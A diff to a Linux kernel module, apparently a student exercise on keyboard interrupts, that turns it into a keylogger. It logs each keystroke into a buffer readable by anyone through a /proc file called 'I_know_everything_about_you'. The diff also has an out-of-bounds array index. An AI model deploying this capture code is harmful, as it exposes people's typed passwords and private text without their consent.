@@ -4,6 +4,8 @@
 #include <linux/init_task.h>
 #include <linux/interrupt.h>
 #include <linux/workqueue.h>
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 #include <asm/io.h>
 
 // Посмотреть инф-ию о обработчике прерывания
@@ -14,9 +16,25 @@
 #define KBD_SCANCODE_MASK 0x7f
 #define KBD_STATUS_MASK 0x80
 
+#define KEYS_COUNT 83
+#define PROC_FILE_NAME "I_know_everything_about_you"
+
+#define MAX_INFO_LAST 256
+#define MAX_LEN_SYMBOL 10
+
+char info_last[MAX_INFO_LAST];
+int curr_index = 0;
+
+struct proc_dir_entry *proc_file_entry;
+
+int my_irq = 1; // Прерывание от клавиатуры.
+static int irq_cnt = 0;
+
+static struct workqueue_struct *my_wq; //очередь работ
+
 char *keyboard_key[] =
 	{
-		"ESC",
+		"[ESC]",
 		"1",
 		"2",
 		"3",
@@ -30,7 +48,7 @@ char *keyboard_key[] =
 		"-",
 		"=",
 		"bs",
-		"Tab",
+		"[Tab]",
 		"Q",
 		"W",
 		"E",
@@ -43,8 +61,8 @@ char *keyboard_key[] =
 		"P",
 		"[",
 		"]",
-		"Enter",
-		"CTRL",
+		"[Enter]",
+		"[CTRL]",
 		"A",
 		"S",
 		"D",
@@ -57,7 +75,7 @@ char *keyboard_key[] =
 		";",
 		"\'",
 		"`",
-		"LShift",
+		"[LShift]",
 		"\\",
 		"Z",
 		"X",
@@ -69,11 +87,11 @@ char *keyboard_key[] =
 		",",
 		".",
 		"/",
-		"RShift",
-		"PrtSc",
-		"Alt",
-		"Space",
-		"Caps",
+		"[RShift]",
+		"[PrtSc]",
+		"[Alt]",
+		" ", // Space
+		"[Caps]",
 		"F1",
 		"F2",
 		"F3",
@@ -84,47 +102,32 @@ char *keyboard_key[] =
 		"F8",
 		"F9",
 		"F10",
-		"Num",
-		"Scroll",
-		"Home (7)",
-		"Up (8)",
-		"PgUp (9)",
+		"[Num]",
+		"[Scroll]",
+		"[Home(7)]",
+		"[Up(8)]",
+		"[PgUp(9)]",
 		"-",
-		"Left (4)",
-		"Center (5)",
-		"Right (6)",
+		"[Left(4)]",
+		"[Center(5)]",
+		"[Right(6)]",
 		"+",
-		"End (1)",
-		"Down (2)",
-		"PgDn (3)",
-		"Ins",
-		"Del",
+		"[End(1)]",
+		"[Down(2)]",
+		"[PgDn(3)]",
+		"[Ins]",
+		"[Del]",
 }; // All: 83 keys.
-
-#define KEYS_COUNT 83
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Alice");
 MODULE_DESCRIPTION("My module!");
 
-int my_irq = 1; // Прерывание от клавиатуры.
-static int irq_cnt = 0;
-
-static struct workqueue_struct *my_wq; //очередь работ
-
-static void my_wq_function(struct work_struct *work) // вызываемая функция
+static void my_wq_function1(struct work_struct *work) // вызываемая функция
 {
-	// For kernel 5.4
-	atomic64_t data64 = work->data;
-	long long data = data64.counter;
-	// For kernel 5.4
-
 	char scancode;
 	int scan_normal;
-
-	printk("Module: my_wq_function data = %lld\n", data);
-	// TODO: А тут ошибка "dereferencing pointer to incomplete type ‘struct workqueue_struct’" (разыменование указателя на неполный тип)
-	// printk("Module: my_wq_function data = %lld\n, WQ:name workqueue: %s, current work color:%d", data, my_wq->name, my_wq->work_color);
+	int len_keyboard_key, i;
 
 	// Считывает скан-код нажатой клавиши.
 	scancode = inb(KBD_DATA_REG);
@@ -139,16 +142,68 @@ static void my_wq_function(struct work_struct *work) // вызываемая ф�
 		if (scan_normal > KEYS_COUNT)
 			printk("Scan: I don't know this keyboard key :c");
 		else
+		{
 			printk("Scan: %s", keyboard_key[scan_normal - 1]);
+		}
+
+		// Circular buffer.
+		len_keyboard_key = strlen(keyboard_key[scan_normal - 1]);
+		if (curr_index + len_keyboard_key > MAX_INFO_LAST)
+			curr_index = 0;
+
+		// Copy keyboard key to buffer.
+		for (i = 0; i < len_keyboard_key; i++)
+		{
+			info_last[curr_index] = keyboard_key[scan_normal - 1][i];
+			curr_index++;
+		}
+		info_last[curr_index] = '\0';
+
+		printk("Scan: [INFO_LAST - 1] = %c curr_index = %d ", keyboard_key[scan_normal - 1][0], curr_index);
+		printk("Scan: [INFO_LAST] = %s ", info_last);
 	}
 
 	return;
 }
 
+static void my_wq_function2(struct work_struct *work) // вызываемая функция
+{
+	// For kernel 5.4
+	atomic64_t data64 = work->data;
+	long long data = data64.counter;
+	// For kernel 5.4
+
+	printk("Module: my_wq_function data = %lld\n", data);
+	// TODO: А тут ошибка "dereferencing pointer to incomplete type ‘struct workqueue_struct’" (разыменование указателя на неполный тип)
+	// printk("Module: my_wq_function data = %lld\n, WQ:name workqueue: %s, current work color:%d", data, my_wq->name, my_wq->work_color);
+}
+
+// Каждый раз при открытии будет обновляться информация.
+static int show(struct seq_file *m, void *v)
+{
+	// Файлы последовательности.
+	// seq_printf используется для записи данных в оперативную память.
+	seq_printf(m, "Length info: %ld\nInfo: %s", strlen(info_last), info_last);
+	return 0;
+}
+
+static int my_proc_open(struct inode *inode, struct file *file)
+{
+	// логируем show() с помощью single_open ?
+	return single_open(file, show, NULL);
+}
+
+static const struct file_operations my_proc_fops =
+	{
+		.open = my_proc_open, // Логируем (определяем) свою собственную ф-ию.
+		.read = seq_read,
+		.release = single_release, // используем single_release, потому что используем single_open (выше).
+};
+
 // Статическая инициализация структуры.
 // Создает (работу) переменную my_work с типом struct work_struct *
-DECLARE_WORK(my_work, my_wq_function);
-DECLARE_WORK(my_work2, my_wq_function);
+DECLARE_WORK(my_work, my_wq_function1);
+DECLARE_WORK(my_work2, my_wq_function2);
 
 irqreturn_t irq_handler(int irq, void *dev, struct pt_regs *regs)
 {
@@ -193,6 +248,12 @@ static int __init md_init(void)
 		return -1;
 	}
 
+	// NULL - parent_dir (это означает, что наш файл находится в /proc)
+	// 0 означает разрешение по умолчанию 0444 ?
+	proc_file_entry = proc_create(PROC_FILE_NAME, 0, NULL, &my_proc_fops);
+	if (proc_file_entry == NULL)
+		return -ENOMEM;
+
 	printk(KERN_INFO "Module: module md start!\n");
 	return 0;
 }
@@ -207,6 +268,10 @@ static void __exit md_exit(void)
 	// my_irq - номер прерывания.
 	// irq_handler - идентификатор устройства.
 	free_irq(my_irq, irq_handler); // Отключение обработчика прерывания.
+
+	// NULL - parent_dir (это означает, что наш файл находится в /proc)
+	remove_proc_entry(PROC_FILE_NAME, NULL);
+
 	printk(KERN_INFO "Module: Goodbye!\n");
 }
 
